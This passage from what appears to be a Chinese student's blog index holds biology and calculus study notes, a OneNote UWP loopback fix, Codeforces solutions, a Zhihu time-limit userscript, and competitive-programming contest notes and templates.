减数分裂是进行有性生殖的生物，在产生成熟生殖细胞时进行的染色体数目减半的细胞分裂。在减数分裂过程中，染色体只复制一次，而细胞分裂两次。减数分裂的结果是，成熟生殖细胞中的染色体数目比原始生殖细胞的减少一半。 减数分裂过程中配对的两条染色体，形状和大小一般相同，一条来自父方，一条来自母方，叫同源染色体。同源染色体两两配对的现象叫做联会。联会后的每对同源染色体含有四条染色单体，叫一个四分体。 减数分裂过程中染色体数目的减半发生在减数第一次分裂。 受精卵中的染色体数目恢复到体细胞中的数目，其中有一半的染色体来自精子 (父方)，另一半来自卵细胞 (母方)。 减数分裂形成的配子, 染色体组成具有多样性, 受精过程中卵细胞和精子结合具有随机性, 同一双亲的后代必然呈现多样性, 有利于生物在自然选择中进化, 体现了有性生殖的优越性 减数分裂和受精作用对于维持每种生物前后代体细胞中染色体数目的恒定, 对于生物的遗传和变异, 都是十分重要的 萨顿的推论: 基因是由染色体携带着从亲代传递给下一代的 基因和染色体行为存在着明显的平行关系。 基因在杂交过程中保持完整性和独立性, 染色体在配子形成和受精过程中, 也有相对稳定的形态结构 基因在体细胞中成对存在, 染色体也是成对的. 在配子中只有成对的基因中的一个, 只有成对的染色体中的一条 体细胞中成对的基因一个来自父方, 一个来自母方. 同源染色体也是如此. 非等位基因在形成配子时自由组合, 非同源染色体在减数第一次分裂后期也是自由组合的 类比推理得出的结论不具有逻辑上的必然性 基因的分离定律的实质是：在杂合体的细胞中，位于一对同源染色体上的等位基因，具有一定的独立性；在减数分裂形成配子的过程中，等位基因会随同源染色体的分开而分离，分别进入两个配子中，独立地随配子遗传给后代。 基因的自由组合定律的实质是：位于非同源染色体上的非等位基因的分离或组合是互不干扰的；在减数分裂过程中，同源染色体上的等位基因彼此分离的同时，非同源染色体上的非等位基因自由组合。 有的基因位于性染色体上，所以遗传上总是和性别相关联，这种现象叫做伴性遗传。 DNA 噬菌体侵染细菌实验 搅拌的目的是使吸附在细菌上的噬菌体与细菌分离 离心的目的是让上清液中析出重量较轻的 噬菌体颗粒, 而离心管的沉淀物中留下被感染的大肠杆菌 因为绝大多数生物的遗传物质是DNA，所以说DNA是主要的遗传物质。 DNA分子双螺旋结构的主要特点是： DNA分子是由两条链组成，这两条链按反向平行方式盘旋成双螺旋结构。 DNA分子中的脱氧核糖和磷酸交替连接，排列在外侧，构成基本骨架；碱基排列在内侧。 两条链上的碱基通过氢键连接成碱基对，并且碱基配对有一定的规律：A（腺嘌呤）一定与T（胸腺嘧啶）配对；G（鸟嘌呤）一定与C（胞嘧啶）配对。碱基之间的这种一一对应的关系，叫做碱基互补配对原则。 DNA分子的复制是一个边解旋边复制的过程，复制需要模板、原料、能量和酶等基本条件。DNA分子独特的双螺旋结构，为复制提供了精确的模板，通过碱基互补配对，保证了复制能够准确地进行。 遗传信息蕴藏在4种碱基的排列顺序之中；碱基排列顺序的千变万化，构成了DNA分子的多样性，而碱基的特定的排列顺序，又构成了每一个DNA分子的特异性；DNA分子的多样性和特异性是生物体多样性和特异性的物质基础。DNA分子上分布着多个基因。 基因是有遗传效应的DNA片段。 基因的表达 RNA是在细胞核中，以DNA的一条链为模板合成的，这一过程称为转录。 游离在细胞质中的各种氨基酸，就以mRNA为模板合成具有一定氨基酸顺序的蛋白质，这一过程叫做翻译。 mRNA 上 3 个相邻的碱基决定 1 个氨基酸, 每 3 个这样的碱基又称作 1 个密码子 一个 mRNA 分子上可以相继结合多个核糖体, 同时进行多条肽链的合成, 因此, 少量的 mRNA 分子就可以迅速合成出大量的蛋白质 基因通过控制酶的合成来控制代谢过程，进而控制生物体的性状。 基因还能通过控制蛋白质的结构直接控制生物体的性状。 基因和性质的关系并不都是简单的线性关系 基因与基因, 基因与基因产物, 基因与环境之间存在着复杂的相互作用, 这种相互作用形成了一个错综复杂的网络, 精细地调控着生物体的性状 突变和育种 DNA分子中发生碱基对的替换、增添和缺失，而引起的基因结构的改变，叫做基因突变。 由于自然界诱发基因突变的因素很多，基因突变还可以自发产生，因此，基因突变在生物界中是普遍存在的。 基因突变是随机发生的、不定向的。 基因突变可以发生在生物个体发育的任何时期 可以发生在细胞内不同的 DNA 分子上 同一 DNA 分子的不同部位 基因突变的不定向性表现为一个基因可以向不同的方向发生突变, 产生一个以上的等位基因 在自然状态下，基因突变的频率是很低的。 基因突变是新基因产生的途径, 是生物变异的根本来源, 是生物进化的原始材料 基因重组是指在生物体进行有性生殖的过程中，控制不同性状的基因的重新组合。 非同源染色体的自由组合, 非等位基因自由组合 同源染色体上的等位基因有时随着非姐妹染色单体的交换而发生交换 有性生殖的基因重组有助于物种在一个无法预测将会发生什么变化的环境中生存, 基因重组也是生物变异的来源之一, 对生物进化也具有重要的意义 染色体结构的改变，会使排列在染色体上的基因的数目或排列顺序发生改变，而导致性状的变异。 染色体数目的变异可以分为两类：一类是细胞内个别染色体的增加或减少，另一类是细胞内染色体数目以染色体组的形式成倍地增加或减少。 染色体组是细胞中的一组非同源染色体, 在形态和功能上各不相同, 但又互相协调, 共同控制生物的生长, 发育, 遗传和变异 二倍体: 由受精卵发育而来的个体, 体细胞中很有两个染色体组 多倍体: 由受精卵发育而来的个体, 体细胞中很有三个或三个以上个染色体组 体细胞中含有本物种配子染色体数目的个体, 叫做单倍体 秋水仙素处理萌发的种子或幼苗: 当秋水仙素作用于正在分裂的细胞时, 能够抑制纺锤体的形成, 导致染色体不能移向细胞两级, 从而引起细胞内染色体数目加倍 人类遗传病通常是指由于遗传物质改变而引起的人类疾病，主要可以分为单基因遗传病、多基因遗传病和染色体异常遗传病三大类。 杂交育种是将两个或多个品种的优良性状通过交配集中在一起，再经过选择和培育，获得新品种的方法。 杂交育种只能利用已有基因的重组, 按需选择, 并不能创造新的基因. 杂交后代会出现分离现象, 育种进程缓慢, 过程复杂 诱变育种是利用物理因素（如X射线、γ射线、紫外线、激光等）或化学因素（如亚硝酸、硫酸二乙酯等）来处理生物，使生物发生基因突变。 基因工程，又叫做基因拼接技术或DNA重组技术。通俗地说，就是按照人们的意愿，把一种生物的某种基因提取出来，加以修饰改造，然后放到另一种生物的细胞里，定向地改造生物的遗传性状。 进化 生活在一定区域的同种生物的全部个体叫做种群。 一个种群中全部个体所含有的全部基因，叫做这个种群的基因库。 在一个种群基因库中，某个基因占全部等位基因数的比率，叫做基因频率。 基因突变产生新的等位基因，这就可能使种群的基因频率发生变化。 突变的有害和有利也不是绝对的, 这往往取决于生物的生存环境 由于突变和重组都是随机的, 不定向的, 因此它们只是提供了生物进化的原材料, 不能决定生物进化的方向 在自然选择的作用下，种群的基因频率会发生定向改变，导致生物朝着一定的方向不断进化。 能够在自然状态下相互交配并且产生可育后代的一群生物称为一个物种。 同一种生物由于地理上的障碍而分成不同的种群, 使得种群间不能发生基因交流的现象, 叫做地理隔离 不同种群间的个体, 在自然条件下基因不能自由交流的现象叫做隔离 隔离是物种形成的必要条件 物种形成本身表示生物类型的增加, 同时也意味着生物能够以新的方式利用环境调节, 从而为生物的进一步发展开辟新的前景 精明的捕食者: 捕食者吃掉的大多是被捕食者中年老, 病弱或年幼的个体, 客观上起到促进种群发展的作用; 捕食者一般不能将所有的猎物都吃掉, 否则自己也无法生存 收割理论: 捕食者往往捕食个体数量多的物种, 这样就会避免出现一种或少数几种生物在生态系统中占绝对优势的局面, 为其他物种的形成腾出空间. 捕食者的存在有利于增加物种多样性 不同物种之间、生物与无机环境之间在相互影响中不断进化和发展，这就是共同进化。","tags":["文化课","生物"],"categories":["课程"]},{"title":"高中数学导数总结","path":"/2020/5/5/Derivative/","content":"定义和几何意义 定义 几何意义: 切线斜率. 割线斜率: 放缩: 证明恒成立可以证明恒大于(小于)交点处切线 公切线问题 求 的公切线. 设 上切点 两点处的切线方程 两切线应当重合, 得到方程组 视情况讨论. 两曲线距离 都有凹凸性, 截线垂直于 x 轴: 两函数做差后求最小值 都有凹凸性, 截线垂直于 y 轴: 先求反函数, 再做差求最小值 直线到曲线距离最小: 导数等于直线斜率 都有凹凸性, 距离最小: 不好直接求, 观察是否有对称关系 三次函数 对称中心: , 有两个极值点, 没有极值点. 切线条数问题 image.png B 点是对称中心. 一区三区(不含边界): 可作 3 条切线 曲线与直线上(不含 B 点): 可做 2 条切线 二区四区和 B 点: 可做 1 条切线 双变量问题 尝试用主元法消除一个变量. 类型的表述, 可转化为与区间内最值有关的恒成立问题. 拉格朗日中值定理 image.png 一定存在切线斜率等于割线斜率. 双变量按 给出, 考虑几何意义. 极值点偏移 确定极值点 . 证明 在极值点一侧单调性 证明 恒大于(小于) 0. 最好分离参数, 使得需要讨论极值点偏移问题的是具体函数. 对数均值不等式: (证明用主元法) 其他 项导数运算时尽量避免出现乘除法 (换元, 参变分离, 另设函数) 计算面积视情况用简洁的公式.","tags":["文化课"],"categories":["课程"]},{"title":"解决 Onenote UWP 版与某不可名状软件搭配使用的同步失败问题","path":"/2020/3/18/Solve-Onenote-Problems-With-SSR/","content":"UWP 存在一个网络隔离机制使得程序无法正常访问 localhost, 表现为 Onenote UWP 版在搭配某不可名状软件使用时界面显示同步失败, 但是网页版上看内容都在. 解决方法: 管理员终端运行 1.\\CheckNetIsolation.exe loopbackexempt -a -p=SID SID 可以去注册表里找. 1\\HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Mappings\\","tags":["废话"],"categories":["技术"]},{"title":"Codeforces Round 606 (Div. 2, based on Technocup 2020 Elimination Round 4)","path":"/2019/12/15/Codeforces-1277/","content":"感觉这场 Div.2 有点水啊, 为什么我这个 AFO 的选手都能过 5 道题… A. Happy Birthday, Polycarp! 签到题, 不多说. 12345678910111213141516171819202122int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { int n = read(); int t = n; int dig = 0; while (t &gt; 0) { dig++; t /= 10; } int ans = 9 * (dig - 1); int64 x = 0; for (int i = 1; i &lt;= dig; i++) { x *= 10; x += 1; } for (int i = 1; i &lt;= 9; i++) { if (x * i &lt;= n) ans++; } cout &lt;&lt; ans &lt;&lt; endl; }} B. Make Them Odd 每次贪心处理当前最大的偶数, 优先队列模拟即可. 12345678910111213141516171819202122232425int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { int n = read(); priority_queue&lt;int&gt; q; for (int i = 1; i &lt;= n; i++) { int x = read(); if (!(x &amp; 1)) q.push(x); } int ans = 0; int c = 0; while (!q.empty()) { int u = q.top(); q.pop(); if (u != c) { c = u; ans++; } if ((u &gt;&gt; 1) &amp; 1) continue; q.push(u &gt;&gt; 1); } write(ans); putchar(' '); }} C. As Simple as One and Two 不难发现, 对于 one, 删掉 n 总是可行的; 对于 two, 删掉 w 总是可行的; 但是对于 twone 的情况, 最优解是删掉 o 12345678910111213141516171819202122232425262728293031323334int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { scanf(\"%s\", s + 1); int n = strlen(s + 1); for (int i = 1; i &lt;= n; i++) { vis[i] = false; } int ans = 0; for (int i = 1; i &lt;= n; i++) { if (vis[i]) continue; if (s[i] == 't' &amp;&amp; s[i + 1] == 'w' &amp;&amp; s[i + 2] == 'o' &amp;&amp; s[i + 3] == 'n' &amp;&amp; s[i + 4] == 'e') { vis[i + 2] = true; ans++; } else if (s[i] == 't' &amp;&amp; s[i + 1] == 'w' &amp;&amp; s[i + 2] == 'o') { vis[i + 1] = true; ans++; } else if (s[i] == 'o' &amp;&amp; s[i + 1] == 'n' &amp;&amp; s[i + 2] == 'e') { vis[i + 1] = true; ans++; } } write(ans); putchar(' '); for (int i = 1; i &lt;= n; i++) { if (vis[i]) { write(i); putchar(' '); } } putchar(' '); }} D. Let’s Play the Words? 00 和 11 的不用反转, 只用反转 01 或 10 使得两者数量只差 1 个就总是可行的; 对于能不能翻转直接用 unordered_set 维护. 注意同时包含 00 和 11 并且没有 01 或 10 是无解的, 特判输出(在这里挂了一次). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int main() { int tcnt = read(); for (int T = 1; T &lt;= tcnt; T++) { vector&lt;pair&lt;int, string&gt;&gt; s01, s10; int c00 = 0, c11 = 0; int n = read(); for (int i = 1; i &lt;= n; i++) { string s; cin &gt;&gt; s; if (s.front() == '0') { if (s.back() == '0') c00++; else s01.push_back(make_pair(i, s)); } else { if (s.back() == '0') s10.push_back(make_pair(i, s)); else c11++; } } if (c00 &gt; 0 &amp;&amp; c11 &gt; 0 &amp;&amp; s01.size() + s10.size() == 0) { puts(\"-1\"); continue; } int d = abs((int)s01.size() - (int)s10.size()) / 2; if (s01.size() &gt; s10.size()) swap(s01, s10); unordered_set&lt;string&gt; s; vector&lt;int&gt; ans; for (auto i : s01) { s.insert(i.second); } for (auto i : s10) { if (ans.size() &gt;= d) break; string rev(i.second.rbegin(), i.second.rend()); if (s.count(rev) == 0) { ans.push_back(i.first); s.insert(rev); } } if (ans.size() &lt; d) { puts(\"-1\"); } else { write(ans.size()); putchar(' '); for (auto i : ans) { write(i); putchar(' '); } putchar(' '); } }} E. Two Fairs 从两个点分别做一次 DFS 就可以了, 满足要求的点对一定有一个只有 A 能 DFS 到, 另一个只有 B 能 DFS 到, 详情见代码. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;typedef long long int64;const int MAXN = 200010;const int INF = 0x3f3f3f3f;class lfs { public: lfs(int N) { n = N; head = new int[n + 2]; memset(head, -1, (sizeof n) * (n + 2)); ecnt = 0; } void adde(int from, int to, int w) { edge cur; cur.to = to; cur.w = w; cur.next = head[from]; head[from] = ecnt++; e.push_back(cur); } void addde(int a, int b, int w) { adde(a, b, w); adde(b, a, w); } int64 solve(int a, int b) { vis1 = new bool[n + 2]; memset(vis1, false, (sizeof false) * (n + 2)); vis2 = new bool[n + 2]; memset(vis2, false, (sizeof false) * (n + 2)); this-&gt;a = a; this-&gt;b = b; dfs(a, 0, vis1); dfs(b, 0, vis2); int64 cnt1 = 0, cnt2 = 0; for (int i = 1; i &lt;= n; i++) { if (vis1[i] &amp;&amp; !vis2[i]) cnt1++; else if (!vis1[i] &amp;&amp; vis2[i]) cnt2++; } return (cnt1 - 1) * (cnt2 - 1); } ~lfs() { delete[] head; delete[] vis1; delete[] vis2; } protected: struct edge { int to, next, w; }; vector&lt;edge&gt; e; int* head; int ecnt; int n; int a, b; bool* vis1; bool* vis2; void dfs(int u, int fa, bool* vis) { vis[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v != fa &amp;&amp; v != a &amp;&amp; v != b) { if (!vis[v]) dfs(v, u, vis); } } }}; 可惜 15 号白天的两场 Div.2 都没时间打了, 不过下个星期六还有一次国人场.","tags":["oi"],"categories":["OI"]},{"title":"知乎定时屏蔽 userscript","path":"/2019/12/14/Zhihu-Smart-Block/","content":"知乎每天限制使用时间, 防止一颓就是几个小时. 特判不限制来自搜索引擎的回答页面, 以便有需要的时候查找资料. 安装链接: GreasyFork 主要自用, 如果有其他功能需求请自己动手丰衣足食. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// ==UserScript==// @name Zhihu Smart Block// @namespace https://duanyll.com/// @version 0.1// @description 按每天使用时间屏蔽知乎, 不屏蔽从百度谷歌必应打开的知乎页面以便查找资料// @author Duanyll// @match http://*.zhihu.com/*// @match https://*.zhihu.com/*// @grant none// ==/UserScript==(function () { \"use strict\"; if (localStorage.getItem(\"timeLimit\") === null) { var timeLimit = \"\"; timeLimit = prompt(\"请设置限制时间(秒), 请自觉保证它是一个整数\"); localStorage.setItem(\"timeLimit\", timeLimit); console.log(`限制时间设置为 ${timeLimit} 秒`); } if ( (document.referrer.includes(\"baidu.com\") || document.referrer.includes(\"google.com\") || document.referrer.includes(\"bing.cn\")) &amp;&amp; window.location.href.includes(\"question\") ) { console.log(\"不限制从搜索引擎打开的知乎页面\"); return; } var isBlocked = false; function checkTime() { function getNowFormatDate() { var date = new Date(); var seperator1 = \"-\"; var year = date.getFullYear(); var month = date.getMonth() + 1; var strDate = date.getDate(); if (month &gt;= 1 &amp;&amp; month &lt;= 9) { month = \"0\" + month; } if (strDate &gt;= 0 &amp;&amp; strDate &lt;= 9) { strDate = \"0\" + strDate; } var currentdate = year + seperator1 + month + seperator1 + strDate; return currentdate; } var lastDate = localStorage.getItem(\"lastDate\"); if (lastDate === getNowFormatDate()) { var timeUsed = Number.parseInt(localStorage.getItem(\"timeUsed\")); if (isNaN(timeUsed)) timeUsed = 0; timeUsed += secondBetweenCheck; var timeLimit = Number.parseInt(localStorage.getItem(\"timeLimit\")); if (timeUsed &gt; timeLimit) { if (!isBlocked) { alert(\"今天的知乎使用时间已到, 按确定关闭知乎.\"); document.body.innerHTML = \"&lt;h1&gt;知乎已屏蔽&lt;/h1&gt;\"; isBlocked = true; } } else { localStorage.setItem(\"timeUsed\", timeUsed.toString()); } } else { localStorage.setItem(\"lastDate\", getNowFormatDate()); localStorage.setItem(\"timeUsed\", \"0\"); console.log(\"这是今天第一次打开知乎\"); } } var secondBetweenCheck = 2; var intervalOutput = setInterval(checkTime, secondBetweenCheck * 1000); window.onblur = () =&gt; clearInterval(intervalOutput); window.onfocus = () =&gt; { intervalOutput = setInterval(checkTime, secondBetweenCheck * 1000); }; console.log(\"已加载知乎限制脚本.\");})();","tags":["项目"],"categories":["技术"]},{"title":"CSP-S 2019 游记 & 感想","path":"/2019/11/23/CSP2019/","content":"Day 0 瘟疫公司真好玩. Day 1 早上起来没去学校直接去考场, 还是那个熟悉的清水河校区. 不过七点钟才起床到考场到的时候有点晚了, 简单看了两眼 CSP 考前急救, 大概把 cdfls 的人都膜了一圈就进去了. 进去之后发现和 dbw 和 dqw 坐的比较近, 遂膜之. 吐槽一下 dbw 和他的右桌之间的隔板没有了, 一览无余…(其实玻璃隔板, 有也一览无余), 然后码了一个平凡的快读. 拿到题先看 T1: 好像是哪一年初赛原题? 然而并不能记得整么写了, 只好从头开始. 听他们都直接一个 for 循环搞定了, 就我一个人写了个 DFS??? 还好 3 分钟码完之后又花了 15 分钟仔细排查了 的 unsigned long long 的锅 (要写成 1ull &lt;&lt; x), 应该是没有错了. T2 身边很多人自测都挂了, 不过我真的觉得这就是个一眼题啊? 首先询问子串数量可以通过一遍差分下放, 只用考虑以每个后括号结束的情况数. 括号匹配合法的首尾括号深度一定相同, 所以在 DFS 时开一个桶表示每个深度的前括号有多少个. 其他的不合法情况是这样的: ())))((((), 处理后括号的计数时把深度比他深的前括号的答案设成 0 就可以了. 10 分钟码完过大样例(Linux, Windows 懒得开栈), 然后开始对拍, 结果对拍的暴力感觉比正解还难写, 还写爆了… 所以这道题我并没有对拍, 之后听他们各种出锅真的虚的很, 还好目前试过的民间数据并没有出锅. T3: 三个小时全部白给了: 再见. Day 2 SC 考前大雾? 能见度大约只有 20 米不到. 真的是来得太晚了, 刚到就进场了, 真的冷, 里面还算暖和. 通读题目: 哦吼, 真的是树竞. T1 花了 40min 想到并写出了 暴力, 得 80 分. T2 被 1Gib 内存和高精吓了一跳, 10min 写了 暴力. T3 先写了 和链的情况. 然后的两个小时就不知道在干什么了, T2 明明 也很显然却没有去想, 把时间都花在 T1 上了, 并没有什么成果. 感想 考完之后我慌的一批, 因为我只写了 375 分的纯暴力, 其他的人在 375 的基础上比我多写一道正解就轻松 400+ 了, 然而星期二自测出来时候不少我觉得应该是 400+ 的人都暴毙到了 100+… 我自己除了 D2T3 的链写炸了之外其他写了的分应该都拿到了. 估计分数线应该在 230 左右. 听说这次 CSP-J 是原题大赛? 随便了, 一般的普及选手也刷不到那么多题. 但是 CSP-S 的树竞专场? 真是一言难尽. CCF 现在是选择了严格遵守了 2015 年发布的所谓考纲, 3 棵树 + 3 个 DP, 除此之外, 数论, 概率, 数据结构, 模拟… 全部没有涉及. 考虑到我还都写的是一眼暴力, 我感觉我这最近一年 OI 似乎是白学了, 今年写了的暴力去年我也写得出来. 增加熟练度? 今年我大概只花了两个半小时就拿到了我能拿的分, 剩下的 5 个小时也想不出来一道题的正解(其实 D2T2 想出正解是有希望的). 反观其他 cdfls 的选手, 很多人都败在了 D1T2 上, 还有好几位想出 D2T2 的正解的 dalao 爆了内存. cdfls 最近一年对联赛选手的培训方向大概是 BFS 型的, 而我们能看出 CCF 现在的联赛命题方向是 DFS 型的, 并且这次许多平时表现优异的选手都出现了暴力写不出来的情况, 还有不少人犯了 最后一分钟(文件名, Subtask 分配, 爆内存等等) 的错误, 我们的培训方向是否有可改进的地方呢? 又从何下手呢? 对于选手, 对于教练, 这都是一个需要思考的问题. 然鹅我已经 AFO 了, 这些事也用不到我来操心了. 但是我对 OI 的热爱是不会变的. 最近的一年我为了跟上 cdfls 的训练计划错过了不少有趣的内容, 我想我以后是会慢慢来研究的. 关于 SCOI 2020, 我想我还是会去到此一游的. 考完写的文章, 现在才发.","tags":["oi","总结"],"categories":["OI"]},{"title":"CSP 考前急救","path":"/2019/11/15/CSP-Rescue/","content":"背板 Exgcd 求逆元 123456789101112131415161718int64 exgcd(int64 a, int64 b, int64&amp; x, int64&amp; y) { if (b == 0) { x = 1; y = 0; return a; } int64 d = exgcd(b, a % b, x, y); int64 tmp = x; x = y; y = tmp - a / b * y; return d;}int64 inv1(int64 a, int64 mod) { int64 x, y; exgcd(a, mod, x, y); return (x % mod + mod) % mod;} 线性递推逆元 1234inv[1] = 1;for (int i = 2; i &lt;= n; i++) { inv[i] = p - (p / i) * inv[p % i] % p;} 矩阵乘法 1234567891011121314template &lt;typename T, size_t h, size_t w, size_t w1&gt;matrix&lt;T, h, w&gt; operator*(const matrix&lt;T, h, w1&gt;&amp; a, const matrix&lt;T, w1, w&gt;&amp; b) {\tmatrix&lt;T, h, w&gt; ans;\tfor (size_t k = 0; k &lt; w1; k++) { for (size_t i = 0; i &lt; h; i++) { if (a[i][k] == 0) continue; for (size_t j = 0; j &lt; w; j++) { ans[i][j] += a[i][k] * b[k][j]; ans[i][j] %= MOD; } }\t}\treturn ans;} 关键一句话: 1ans[i][j] += a[i][k] * b[k][j]; 有关组合数 123456int64 a = 1, b = 1;for (int i = 0; i &lt; m; i++) {\ta = a * (n - i) % mod;\tb = b * (i + 1) % mod;}return a * pow(b, mod - 2, mod) % mod; 卢卡斯定理 123lucas(n, m, mod) { return lucas(n / mod, m / mod, mod) * c(n % mod, m % mod, mod) % mod;} tarjan scc 1234567891011121314151617181920212223242526void tarjan(int u) { dfn[u] = low[u] = tim++; s.push(u); ins[u] = true; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dfn[v] == -1) { tarjan(v); low[u] = min(low[u], low[v]); } else { if (ins[v]) { low[u] = min(low[u], dfn[v]); } } } if (dfn[u] == low[u]) { scccnt++; int v = 0; while (v != u) { v = s.top(); s.pop(); ins[v] = false; belong[v] = scccnt; } }} tarjan 割顶 1234567891011121314151617181920void dfs(int u, int fa) { int cc = 0; dfn[u] = low[u] = tim++; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (dfn[v] == -1) { dfs(v, u); cc++; low[u] = min(low[u], low[v]); if (fa != -1 &amp;&amp; low[v] &gt; dfn[u]) { ans.push_back(u); } } else if (v != fa) { low[u] = min(low[u], dfn[v]); } } if (fa == -1 &amp;&amp; cc &gt;= 2) { ans.push_back(u); }} DFS 后要对 ans 进行 unique 操作, 或直接用 set. tarjan bcc 1234567891011121314151617181920212223242526272829303132333435void dfs(int u, int fa) { dfn[u] = low[u] = ++tim; for (int i = head[u]; i != -1; i = e[i].next) { int v = e[i].to; if (v == fa) continue; if (dfn[v] == 0) { s.push(make_pair(u, v)); dfs(v, u); low[u] = min(low[u], low[v]); if (low[v] &gt;= dfn[u]) { vector&lt;int&gt; cur; bcccnt++; pair&lt;int, int&gt; now; do { now = s.top(); s.pop(); if (color[now.first] != bcccnt) { cur.push_back(now.first); color[now.first] = bcccnt; belong[now.first].push_back(bcccnt); } if (color[now.second] != bcccnt) { cur.push_back(now.second); color[now.second] = bcccnt; belong[now.second].push_back(bcccnt); } } while (!(now.first == u &amp;&amp; now.second == v)); bccs.push_back(cur); } } else if (dfn[v] &lt; dfn[u]) { s.push(make_pair(u, v)); low[u] = min(low[u], dfn[v]); } }} EK 网络流 思想: 暴力 BFS 找增广路. 12345678910111213141516171819202122232425262728293031int flow = 0;while (true) { memset(a, 0, sizeof a); queue&lt;int&gt; q; q.push(s); a[s] = INF; while (!q.empty()) { int u = q.front(); q.pop(); for (int i : g[u]) { edge&amp; now = e[i]; if (a[now.to] == 0 &amp;&amp; now.cap &gt; now.flow) { fa[now.to] = i; a[now.to] = min(a[u], now.cap - now.flow); q.push(now.to); } } if (a[t] &gt; 0) { //剪枝：已经找到了一条 break; } } if (a[t] == 0) { //没有增广路了 break; } for (int u = t; u != s; u = e[fa[u]].from) { e[fa[u]].flow += a[t]; e[fa[u] ^ 1].flow -= a[t]; } flow += a[t];}return flow; 最小费用流: 每次用 Dijkstra / SPFA 找增广路. 树剖 第一遍 DFS 找重儿子, 第二遍 DFS 给点编号. (至少预留 30min 打树剖). 线性筛质数 123456789101112131415161718void make_prime() { prime_cnt = 0; memset(isntp, false, sizeof(isntp)); for (int i = 2; i &lt;= AMXA; ++i) { if (!isntp[i]) { prime[prime_cnt++] = i; } for (int j = 0; j &lt; prime_cnt; ++j) { if (i * prime[j] &gt; AMXA) { break; } isntp[i * prime[j]] = true; if (i % prime[j] == 0) { break; } } }} STL 我个人认为在绝大多数情况下为了卡常而放弃 STL 放弃代码可读性是一种得不偿失的行为. lower_bound 找第一个大于等于目标的元素 upper_bound 找第一个大于目标的元素 以上两者返回指向目标元素的指针, 减去数组开头地址得到 0 开始的下标. 强行用 unordered_map 救急: 12#include &lt;tr1/unordered_map&gt;using std::tr1::unordered_map; 别的东西 背包分清楚要不要重复枚举同一个节点, 从大到小还是从小到大枚举. 不要把 DP 状态表示的复杂度当成 DP 转移的复杂度! 实际上很多暴力算法往往转移会比状态表示大一两个数量级! 链式前向星记得 memset(head, -1, sizeof head). 能不写平衡树就不写平衡树! 真的要写先画图! 坚决不写维护父指针的 splay! Dijkstra 能过坚决不写 SPFA! 快读快写码完要测试! 把 Dev-C++ 的自动保存拉到最快, 重构代码不要删掉原来的! 对拍 最好带文件一起对拍. Windows bat 1234567@echo offproblem_genproblemproblem_stdfc problem.out problem1.outif not ERRORLEVEL 1 goto looppause Linux sh 1234567891011while true; do ./problem_gen ./problem ./problem_std if diff problem.out problem1.out; then printf \"AC \" else printf \"WA \" exit 0; fidone 常见的 DFS 优化: 优化搜索顺序 结合二分 可行性剪枝 最优化剪枝 记忆化 预处理 常见的 DP 优化 单调队列 / 单调栈 尝试分治 斜率优化 结合线段树 前缀和优化 矩阵快速幂 (初始参数不多, 转移跨度不大) 不证明结论, 直接瞎贪心 吉利模数 1e9 + 7 1e7 + 9 998244353 19260817","tags":["oi"],"categories":["OI"]},{"title":"NOI Linux 存活指北","path":"/2019/11/11/NOI-Liunx-Survival-Guide/","content":"启动 电子科大考场 在桌面上或开始菜单里有一个叫做 VMWare Workstation 或者 VMWare Player 的软件, 双击运行后, 默认应该已经打开了 NOI Linux 虚拟机的操作界面 (如果没有请咨询考场工作人员). 点击菜单栏上的绿色播放按钮就可以运行虚拟机了. 你可以全屏或者窗口化运行虚拟机. CDFLS 镜像列表里面有一个 NOI Linux 选项, 选他就是了. 注意事项: 分辨率要自己设, 右上角菜单 &gt; 设置 &gt; 显示 要上网的话, IP 要自己设, 右上角 WiFi 图标 &gt; 连接属性 &gt; wired connection 2 &gt; 属性 &gt; ipv4, 自己看着办. 拖动窗口时轻拿轻放, 遇到花屏就用另一个窗口把花掉的部分挡一下再来. 简单的使用 锁屏密码是 123456. CCF 为我们预装了一个叫做 GUIDE 的 C++ IDE, 类似 Dev-C++, 但是界面丑陋, Bug 繁多, 此处不讲解也不推荐使用. 在电子科大的 VMWare 环境下, 你可以直接将 cpp 文件和大样例拖到虚拟机的桌面上, 或者直接使用剪贴板复制粘贴文件. 当然, 你也可以直接在 NOI Linux 里写题. 推荐直接使用终端编译和运行你的程序, 方法如下 按 Ctrl + Alt + T 打开终端 输入 cd Desktop 切换到桌面 (Linux 严格区分文件名的大小写) 输入 ls 查看当前文件夹内容, 确保这里有你的 cpp 输入编译指令 (NOIP 的题面 PDF 中有, 直接复制粘贴), 如果你要自己编译, 应该这样: 1g++ filename.cpp -o filename.out -Wall -Wextra 注意: 在 Linux 下, 如果一条指令没有任何输出, 说明他执行成功了. &gt; 没有消息就是最好的消息 不同于 Windows 的可执行文件一定是 *.exe (严谨来说, 还有 *.com, *.bat 等等), Linux 并不按照扩展名区分是否可执行文件. 也就是说, 可执行文件可以使任意扩展名, 或者没有扩展名 (多数情况是这样). 要执行当前目录下一个叫做 filename.out 的可执行文件, 输入 ./filename.out Linux 对于内存越界等错误的检测更加严格. 如果你不会 Vim 或者是 Emacs, 请使用 GEdit, 他就是一个普通的记事本. 在终端里复制和粘贴要使用 Ctrl + Shift + C 和 Ctrl + Shift + V, 按 Ctrl + C 终止正在运行的程序(比如无限死循环了), 然而在终端和 Vim / Emacs 以外的地方就是普通的 Ctrl + C/V 了. 加栈用 ulimit -s 1000000000, 仅对当前终端会话有效. vim / Emacs 问 hxy / 百度. Arbiter (CCF 御用评测软件) 我也不会用. 一些奇怪的预定义函数 index prev next data 这些标识符可以用于重载的函数, 局部变量, 但不能用于全局变量. 解决全局变量重名的根本办法: 1234567891011121314#include &lt;bits/stdc++.h&gt;using namespace std;namespace solution {int data, index, prev, next;void work() { cin &gt;&gt; data; // ... cout &lt;&lt; data &lt;&lt; endl;}} // namespace 